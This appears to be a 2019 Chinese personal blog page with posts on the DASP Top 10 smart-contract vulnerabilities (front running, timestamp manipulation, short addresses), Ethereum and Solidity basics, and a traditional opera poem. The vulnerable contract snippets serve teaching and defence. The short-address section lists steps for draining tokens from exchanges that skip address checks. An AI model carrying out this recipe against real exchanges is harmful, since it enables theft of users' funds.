<h2 id="避坑技巧-2"><a href="#避坑技巧-2" class="headerlink" title="避坑技巧"></a>避坑技巧</h2><p>熵的来源必须是区块链的外部。这可以在具有诸如commit-reveal之类系统的对等体之间完成，或者通过将信任模型改变为一组参与者（例如在RandDAO中）来完成。不过区块变量不应该用做源熵，因为它们可以被矿工操纵。</p>
<hr>
<h1 id="top-7-Front-Running"><a href="#top-7-Front-Running" class="headerlink" title="top 7 Front Running"></a>top 7 Front Running</h1><h2 id="Info-4"><a href="#Info-4" class="headerlink" title="Info"></a>Info</h2><p>可以理解为因为区块链是公开，其他用户或者合约的交易信息均透明可查，恶意用户可以利用这些已知信息制造有利于自己的交易，并通过提高手续费的方式抢先执行获利。</p>
<h2 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h2><h3 id="例子一，一个游戏"><a href="#例子一，一个游戏" class="headerlink" title="例子一，一个游戏"></a>例子一，一个游戏</h3><p>LastIsMe是一个lottery游戏合约，在一个游戏回合（一定的区块数内）参与者购买一张票认领最后一个座位，回合结束时最后一个就坐的玩家会获得头奖。</p>
<p>攻击者可以在回合快结束时观察其他玩家的交易池，通过提高gas来挤掉其他玩家的交易从而获得奖金。</p>
<h3 id="例子二，一道CTF"><a href="#例子二，一道CTF" class="headerlink" title="例子二，一道CTF"></a>例子二，一道CTF</h3><p>5个块为一回合，回合内参与者猜一个数字，回合结束时机器人会随机抛出一个数字，如果谁猜中谁就获胜。而该合约存在前置执行漏洞。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">spinLottery</span><span class="params">(uint number)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msg.sender != robotAddress) &#123;</span><br><span class="line">        playerNumber[msg.sender] = number;</span><br><span class="line">        players.push(msg.sender);</span><br><span class="line">        NewLotteryBet(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        require(block.number - lotteryBlock &gt; <span class="number">5</span>);</span><br><span class="line">        lotteryBlock = block.number;</span><br><span class="line">        <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; players.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (playerNumber[players[i]] == number) &#123;</span><br><span class="line">                desires[players[i]].active = <span class="keyword">true</span>;</span><br><span class="line">                desires[players[i]].email = <span class="string">"*Use changeEmail func to set your email.*"</span>;</span><br><span class="line">                Proposal(players[i], desires[players[i]].email);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        delete players; <span class="comment">// flushing round</span></span><br><span class="line">        NewLotteryRound(lotteryBlock);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>机器人发布的随机数明文提交到交易池，如果攻击者能够足够快的检索pending交易并找到该随机数，然后使用该随机数参与游戏，保证两笔交易在同一个块中，并提高gas在机器人发布随机数的交易之前执行，就能获胜。</p>
<h2 id="避坑技巧-3"><a href="#避坑技巧-3" class="headerlink" title="避坑技巧"></a>避坑技巧</h2><p>有两类人可以执行这些正在运行的非法预先交易攻击：用户（他们修改交易的gasPrice）和矿工本身（他们可以按照他们认为合适的方式在一个区块中重新对交易排序）。</p>
<p>对于第一类来说，他们的合约比第二类合约要糟糕得多，因为矿工只有在解决了一个区块时才能进行攻击，而对于任何一个专门针对某个特定区块的矿工来说，这种攻击都是不可能的实现的。</p>
<p>我们可以将列出一些防坑措施。</p>
<p>首先，我们可以采用在合约中创建逻辑，为gasPrice设置一个上限。这使得用户无法提高gasPrice，这可以避免因提高gasPrice获得超出上限的优先交易顺序。这种预防措施只能减少第一类攻击者（任意使用者）。</p>
<p>在这种情况下，矿工仍然可以攻击合约，因为他们可以无论gasPrice如何，都可以随心所欲地在他们所在区块内进行交易。</p>
<p>另外，还有另一个方法是尽可能使用commit-reveal。这种方案要求用户使用隐藏的信息（通常是哈希）发送交易。在将交易包含在一个区块之后，用户发送一个交易来显示发送的数据（显式阶段）。这种方法使得矿工和用户无法确定交易的内容，因此不能对交易进行预警。</p>
<p>然而，这种方法不能隐藏交易的价值，智能合约允许用户发送交易，其提交的数据包括了他们愿意花费的以太币数量。然后用户可以发送任意值的交易。在这个阶段，用户可以获得交易中发送的金额与他们愿意支出金额之间的差额。</p>
<hr>
<h1 id="top-8-Time-Manipulation"><a href="#top-8-Time-Manipulation" class="headerlink" title="top 8 Time Manipulation"></a>top 8 Time Manipulation</h1><h2 id="Info-5"><a href="#Info-5" class="headerlink" title="Info"></a>Info</h2><p>一个合约需要用到“当前时间”，通常是通过block.timestamp或者now来实现，而这个值来源于矿工。矿工可以在区块被验证后30s内发布时间戳，从而利用这30s的时间增加自己获利概率。</p>
<h2 id="例子-theRun"><a href="#例子-theRun" class="headerlink" title="例子 theRun"></a>例子 theRun</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一个合约需要用到“当前时间”，通常是通过block.timestamp或者now来实现，而这个值来源于矿工。矿工可以在区块被验证后30s内发布时间戳，从而利用这30s的时间增加自己获利概率。</span></span><br><span class="line">uint256 constant <span class="keyword">private</span> salt =  block.timestamp;</span><br><span class="line"></span><br><span class="line"><span class="function">function <span class="title">random</span><span class="params">(uint Max)</span> constant <span class="keyword">private</span> <span class="title">returns</span> <span class="params">(uint256 result)</span></span>&#123;</span><br><span class="line">    <span class="comment">//get the best seed for randomness</span></span><br><span class="line">    uint256 x = salt * <span class="number">100</span>/Max;</span><br><span class="line">    uint256 y = salt * block.number/(salt % <span class="number">5</span>) ;</span><br><span class="line">    uint256 seed = block.number/<span class="number">3</span> + (salt % <span class="number">300</span>) + Last_Payout + y; </span><br><span class="line">    uint256 h = uint256(block.blockhash(seed)); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> uint256((h / x)) % Max + <span class="number">1</span>; <span class="comment">//random number between 1 and Max</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>theRun合约使用block.timestamp作为随机数种子，而矿工完全可以在30s内计算一个利于获胜的随机数。</p>
<h2 id="避坑技巧-4"><a href="#避坑技巧-4" class="headerlink" title="避坑技巧"></a>避坑技巧</h2><p>区块时间戳不应该用于熵或产生随机数，例如，它们不应成为（直接或通过某种推导）赢得一场比赛或改变一个重要的状态（如果假设是随机的）的决定性因素。</p>
<p>有敏锐的时间逻辑有时是必要的，例如解锁合约（timelocking）在几周后完成一个 ICO 或强制执行过期日期。有时建议使用block.number和一个平均区块时间来估计时间。</p>
<p>例如，一个星期零10秒钟的区块时间，相当于大约60480个区块生成时间。因为矿工无法轻易操纵区块序数，所以指定一个区块序数来更改合约状态可以更加安全，BAT ICO合约就采用了这一策略。</p>
<p>如果合约不是特别关注矿工操纵的区块时间戳，也可以不用这样做，但是在开发合约时需要注意这一点。</p>
<hr>
<h1 id="top-9-Short-Addresses"><a href="#top-9-Short-Addresses" class="headerlink" title="top 9 Short Addresses"></a>top 9 Short Addresses</h1><h2 id="info-1"><a href="#info-1" class="headerlink" title="info"></a>info</h2><p>这个漏洞现在已经修复了，可以算之前EVM的缺陷。</p>
<blockquote>
<p>The Contract Application Binary Interface (ABI) is the standard way to interact with contracts in the Ethereum ecosystem, both from outside the blockchain and for contract-to-contract interaction.</p>
</blockquote>
<h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">contract MyToken &#123;</span><br><span class="line">    mapping (address =&gt; uint) balances;</span><br><span class="line"> </span><br><span class="line">    event Transfer(address indexed _from, address indexed _to, uint256 _value);</span><br><span class="line"> </span><br><span class="line">    function MyToken() &#123;</span><br><span class="line">        balances[tx.origin] = 10000;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function sendCoin(address to, uint amount) returns(bool sufficient) &#123;</span><br><span class="line">        if (balances[msg.sender] &lt; amount) return false;</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">        balances[to] += amount;</span><br><span class="line">        Transfer(msg.sender, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function getBalance(address addr) constant returns(uint) &#123;</span><br><span class="line">        return balances[addr];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当我们转币给其它地址时，会调用sendCoin方法。当地址to丢失末尾两位，会在value的右侧补0，造成value*256。</p>
<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>这个东西要这么用。</p>
<p>1、首先生成一个ETH的靓号，这个账号末尾为2个0，使用一些跑号工具可以做到。<br>2、找一个交易所钱包，该钱包里token数量为25600，往这个钱包发送1000个币。<br>3、然后再从这个钱包中提出1000个币，这时候写地址的时候把最后两个0去掉，如果交易所并没有校验用户填入的以太坊地址，则EVM会把所有函数的参数一起打包，会把amount参数的高位1个字节吃掉。<br>4、这三个参数会被传入到msg.data中，然后调用合约的transfer方法，此时，amount由于高位的1个字节被吃掉了，因此amount = amount &lt;&lt; 8，即扩大了256倍，这样就把25600个币全部提出来了。</p>
<h2 id="避坑技巧-5"><a href="#避坑技巧-5" class="headerlink" title="避坑技巧"></a>避坑技巧</h2><p>显而易见，在将所有输入发送到区块链之前进行验证，将会有效防止这类攻击。此外，参数排序在这里起着重要的作用。由于填充只发生在最后，智能合约中对参数的仔细排序可以防患于未然。</p>
<hr>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/programming/">编程</a>
    </div>


      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Ethereum/">Ethereum</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-Ethereum-background" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/03/13/Ethereum-background/" class="article-date">
      <time datetime="2019-03-13T11:16:08.000Z" itemprop="datePublished">2019-03-13</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/13/Ethereum-background/">以太坊背景知识</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="0x00-以太坊"><a href="#0x00-以太坊" class="headerlink" title="0x00 以太坊"></a>0x00 以太坊</h2><h3 id="以太坊入门，快速理解一些概念"><a href="#以太坊入门，快速理解一些概念" class="headerlink" title="以太坊入门，快速理解一些概念"></a>以太坊入门，快速理解一些概念</h3><p><a href="http://me.tryblockchain.org/getting-up-to-speed-on-ethereum.html" target="_blank" rel="noopener">http://me.tryblockchain.org/getting-up-to-speed-on-ethereum.html</a></p>
<h3 id="以太坊"><a href="#以太坊" class="headerlink" title="以太坊"></a>以太坊</h3><p>以太坊，Ethereum是一个分布式的计算机，有许多的节点，其中的每一个节点，都会执行字节码（其实就是智能合约），然后把结果存在区块链上。由于整个网络是分布式的，且应用就是一个个的状态组成，存储了状态就有了服务；所以它就能永不停机，没有一个中心化的结点（没有任何一个节点说了算，去中心化的），任何第三方不能干预。</p>
<p>显然上面这一段话，直接解释了以太坊是什么。但你可能有非常多的问题。以太坊入门，就是看白皮书最好，最快。</p>
<h3 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h3><p>智能合约与平时的代码其实没有什么区别，只是运行于一个以太坊这样的分布式平台上而已。这个运行的平台，赋予了这些代码不可变，确定性，分布式和可自校验状态等特点。代码运行过程中状态的存储，是不可变的。每一个人，都可以开一个自己的节点，重放整个区块链，将会获得同样的结果（能控制所有节点都达到一致状态，就是所谓的共识）。</p>
<p>在以太坊中，每个合约都有一个唯一的地址来标识它自己（由创建者的哈希地址和曾经发送过的交易的数量推算出来）。客户端可以与这个地址进行交互，可以发送ether，调用函数，查询当前的状态等。</p>
<p>智能合约，本质上来说就是代码，以及代码运行后存储到区块链上的状态两个元素组成。比如，你用来收发ETH的钱包，本质上就是一个智能合约，只是外面套了一个界面。</p>
<h3 id="Gas"><a href="#Gas" class="headerlink" title="Gas"></a>Gas</h3><p>智能合约，就是一些代码，运行整个分布式网络中。由于网络中的每一个节点都是一个全节点。这样的好处是容错性强，坏处是效率低，消耗资源与时间（原来只在一个节点执行一次就行，现在所有节点中每一个，都要执行一模一样的运算）。因为执行计算要花钱，而要执行的运算量与代码直接相关。所以，每个在网络运行的底层操作都需要一定量的gas。gas只是一个名字，它代表的是执行所需要花费的成本（由于以太坊是图灵完备的，随便一个死循环就将导致网络不可用，所以引入了gas的概念）。整个分布式网络引入了强制限制，来避免停机问题。因此如果你写一个死循环，当gas耗尽后，网络就会拒绝执行接下来的操作，并且回滚你之前的所有操作。</p>
<p>gas的价格由市场决定，类似于比特币的交易费机制。如果你的gas价格高，节点则将优先因为利益问题打包你的交易。</p>
<p>一般来说，在Ethereum中计算和存储东西比在传统环境中做的更为昂贵，但是，Ethereum为您的代码提供了上述我们讨论过的那些好的属性，这可能是一样有价值的。</p>
<p>一般来说，在以太坊网上读取状态是免费的，只有写入状态是收费的。</p>
<h4 id="DAPP"><a href="#DAPP" class="headerlink" title="DAPP"></a>DAPP</h4><p>DApp是Decentralized Application的缩写，译为:分散式的应用程序。DApp运行在去中心化的网络上，也就是区块链网络中。网络中不存在中心化的节点可以完整的控制DApp。传统App是中心化的。需要请求某台服务器来获取数据，处理数据等。一个完全的DApp是需要满足完全开源并且是自治的应用程序。DApp一经部署完毕，就不可更改。应用的升级必须由大部分用户达成共识之后才可以进行升级。所有的数据必须进行加密存储在去中心化的区块链应用平台上。没有中心化的机构能够进行干扰。不会出现某些数据的删除或者修改。</p>
<h3 id="以太坊交易过程"><a href="#以太坊交易过程" class="headerlink" title="以太坊交易过程"></a>以太坊交易过程</h3><p>用户将一笔交易发送到一个以太坊节点。</p>
<p>这个以太坊节点将交易转发给其它挖矿的节点。</p>
<p>挖矿的节点收到交易后将交易放入txpool（交易池）。</p>
<p>所有挖矿节点都在txpool中选择gas价高者，做成交易块，然后运算块的hash。</p>
<p>若干个节点中的一个幸运儿运算出来hash，并交该块广播给其它节点验证。</p>
<p>其它节点验证通过，在txpool中删除上链交易。</p>
<h2 id="0x01-环境-metamask-remix（方便）"><a href="#0x01-环境-metamask-remix（方便）" class="headerlink" title="0x01 环境 metamask+remix（方便）"></a>0x01 环境 metamask+remix（方便）</h2><p>官网安装metamask（科学上网）。<a href="http://remix.ethereum.org（不能用https）。" target="_blank" rel="noopener">http://remix.ethereum.org（不能用https）。</a></p>
<p>注册一个账号，（坑：记单词顺序），然后在测试链上<strong>要钱</strong>。</p>
<p>本地链玄学。</p>
<h2 id="0x02-solidity语法的一些问题"><a href="#0x02-solidity语法的一些问题" class="headerlink" title="0x02 solidity语法的一些问题"></a>0x02 solidity语法的一些问题</h2><h3 id="call-与-delegatecall"><a href="#call-与-delegatecall" class="headerlink" title="call 与 delegatecall"></a>call 与 delegatecall</h3><p>向合约发送消息有两种底层调用的接口，一个是call，一个是delegatecall。</p>
<p>call的原型为：<br><code>&lt;address&gt;.call.value(...)(...) returns (bool)</code></p>
<p>delegatecall原型为：<br><code>&lt;address&gt;.delegatecall(...) returns (bool)</code></p>
<p>这个东西在新版返回一个元组，第一个是bool，元组是随便一些变量的列表，tuple一般是两个。</p>
<p>二者的异同：</p>
<p>相同|不同</p>
<ol>
<li>调用时传递合约所有gas|1. call可以使用.value传ETH</li>
<li>执行失败返回false|2. call的外部调用上下文是外部合约，而delegatecall的外部调用上下文是自身</li>
</ol>
<h3 id="tx-origin-与-msg-sender"><a href="#tx-origin-与-msg-sender" class="headerlink" title="tx.origin 与 msg.sender"></a>tx.origin 与 msg.sender</h3><h3 id="private-public-internal-external-view-pure"><a href="#private-public-internal-external-view-pure" class="headerlink" title="private public internal external view pure"></a>private public internal external view pure</h3><h3 id="fallback"><a href="#fallback" class="headerlink" title="fallback"></a>fallback</h3><p>两种情况会调用fallback：</p>
<p>调用函数找不到时。向合约发送ether时。</p>
<h3 id="转账"><a href="#转账" class="headerlink" title="转账"></a>转账</h3><ol>
<li><address>.transfer()    //失败抛出throw且回滚，2300gas</address></li>
<li><address>.send()    //失败返回false，2300gas</address></li>
<li><address>.gas().call.value()()    //失败返回false，所有gas</address></li>
</ol>
<h3 id="合约地址"><a href="#合约地址" class="headerlink" title="合约地址"></a>合约地址</h3><p>一份已创建的合约地址由以下函数决定:</p>
<p><code>keccak256(rlp.encode([&lt;account_address&gt;, &lt;transaction_nonce&gt;])</code></p>
<p>以太坊要求每笔交易必须有一个nonce数值。nonce值从0开始递增，每发送一笔交易，nonce便加1。</p>
<h3 id="this"><a href="#this" class="headerlink" title="this"></a>this</h3><p>this是一个指针，旧版this是当前地址，新版address(this)是当前合约地址，具体看文档。</p>
<h3 id="新版细节"><a href="#新版细节" class="headerlink" title="新版细节"></a>新版细节</h3><p>remix让怎么办就怎么办。</p>
<h3 id="memory-与-storage"><a href="#memory-与-storage" class="headerlink" title="memory 与 storage"></a>memory 与 storage</h3><p>struct在旧版中，在函数是声明默认是storage，storage是个指针啊，不初始化的话它就是个没有对象的野指针，默认指在slot 0。</p>
<h2 id="0x03-solidity内部存储机制"><a href="#0x03-solidity内部存储机制" class="headerlink" title="0x03 solidity内部存储机制"></a>0x03 solidity内部存储机制</h2><p>Solidity中的状态变量存储模型。</p>
<p>Solidity预留了3个32字节大小的槽位：</p>
<p>· 0-64: 哈希方法的暂存空间。</p>
<p>· 64-96: 当前已分配内存大小(也称空闲内存指针)。</p>
<p>暂存空间可在语句之间使用（如在内联编译时使用）。</p>
<p>有一些在Solidity中的操作需要超过64字节的临时空间，这样就会超过预留的暂存空间。他们就将会分配到空闲内存指针所在的地方，但由于他们自身的特点，生命周期相对较短，且指针本身不能更新，内存也许会，也许不会被清零。因此，不应该认为空闲的内存一定已经是清零的。</p>
<p>理解模型有几个关键点：</p>
<p>1.合约的存储由一个256位指针处理，而合约内的变量都存储在以合约指针为基址的偏移地址中。</p>
<p>2.大小固定的变量（除了mapping，变长数组以外的所有类型）在存储中是依次连续从位置0开始排列在一个32字节槽中。</p>
<p>3.如果多个变量占用的大小少于32字节，会尽可能的打包到单个槽位里。</p>
<p>4.由于mapping和变长数组的大小不可预知，因此定义使用keccak256哈希来计算数据存储位置。</p>
<p>5.对于mapping，会在mapping定义位置（p）占用一个槽位，但其中无数据，而数据存储位置通过 keccak256(k . p)计算得到，k为mapping键。</p>
<p>6.对于动态数组，会在数组定义位置（p）占用一个槽位，存储数组元素个数，而数据存储位置通过 keccak256(p)计算得到。</p>
<h2 id="gt-gt"><a href="#gt-gt" class="headerlink" title="-&gt; -&gt;"></a>-&gt; -&gt;</h2><p>2018年/前10dapp漏洞。<a href="https://www.dasp.co/" target="_blank" rel="noopener">https://www.dasp.co/</a></p>
<p>SSD’s wiki</p>
<p>在这个平台练习那些漏洞 <a href="https://ethernaut.zeppelin.solutions" target="_blank" rel="noopener">https://ethernaut.zeppelin.solutions</a></p>
<h2 id="DASP-Top10"><a href="#DASP-Top10" class="headerlink" title="DASP Top10"></a>DASP Top10</h2><ol>
<li>Reentrancy</li>
<li>Access Control</li>
<li>Arithmetic</li>
<li>Unchecked Low Level Calls</li>
<li>Denial of Services</li>
<li>Bad Randomness</li>
<li>Front Running</li>
<li>Time Manipulation</li>
<li>Short Addresses</li>
<li>Unknown Unknowns</li>
</ol>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/programming/">编程</a>
    </div>


      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Ethereum/">Ethereum</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-start-poem" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/03/08/start-poem/" class="article-date">
      <time datetime="2019-03-08T11:10:30.000Z" itemprop="datePublished">2019-03-08</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/08/start-poem/">定场诗</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <center>天为罗盖地为毯，日月星辰伴我眠。</center><br><center>什么人撒下名利网，富贵贫困不一般。</center><br><center>也有骑马与坐轿，也有推车把担担。</center><br><center>骑马坐轿修来的福，推车担担命该然。</center><br><center>骏马驮着痴呆汉，美妇人常伴拙夫眠。</center><br><center>八十老翁门前站，三岁顽童染黄泉。</center><br><center>不是老天不长眼，天理昭彰这报应循环。</center>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/opera/">听戏</a>
    </div>


      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/定场诗/">定场诗</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
    </nav>
  
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2019 ssj
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" >到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="/js/main.js"></script>

    <script>
        $(document).ready(function() {
            var backgroundnum = 13;
            var backgroundimg = "url(/background/bg-" + backgroundnum +".jpg)";
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(

            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


  </div>
</body>
</html>